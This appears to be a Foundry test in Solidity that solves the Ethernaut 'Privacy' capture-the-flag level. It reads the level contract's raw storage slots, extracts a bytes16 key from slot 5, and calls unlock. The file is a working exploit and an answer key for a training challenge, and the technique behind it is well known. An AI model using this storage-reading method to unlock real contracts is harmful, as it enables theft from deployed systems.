pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Privacy/PrivacyFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract PrivacyTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        vm.warp(1641070800);
    }

    function testPrivacyHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        

        emit log_bytes32(vm.load(address(ethernautPrivacy), bytes32(uint256(0))));
        emit log_bytes32(vm.load(address(ethernautPrivacy), bytes32(uint256(1))));
        emit log_bytes32(vm.load(address(ethernautPrivacy), bytes32(uint256(2))));
        emit log_bytes32(vm.load(address(ethernautPrivacy), bytes32(uint256(3))));
        emit log_bytes32(vm.load(address(ethernautPrivacy), bytes32(uint256(4))));
        emit log_bytes32(vm.load(address(ethernautPrivacy), bytes32(uint256(5))));

        bytes16 key = bytes16(vm.load(address(ethernautPrivacy), bytes32(uint256(5))));
        ethernautPrivacy.unlock(key);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}